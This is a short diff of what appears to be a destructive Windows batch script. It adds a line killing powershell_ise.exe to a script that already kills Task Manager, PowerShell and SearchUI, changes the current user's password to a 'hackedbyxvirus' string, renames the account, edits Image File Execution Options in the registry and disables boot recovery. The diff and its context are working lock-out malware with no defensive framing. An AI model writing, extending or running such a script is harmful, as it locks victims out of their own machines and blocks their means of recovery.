@@ -136,6 +136,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 taskkill /f /im SearchUI.exe
 taskkill /f /im taskmgr.exe
 taskkill /f /im powershell.exe
+taskkill /f /im powershell_ise.exe
 net user %username% hackedbyxvirus%random%
 wmic useraccount where name="%username%" rename "hackedbyxvirus%random%"
 bcdedit /set {default} recoveryenabled No
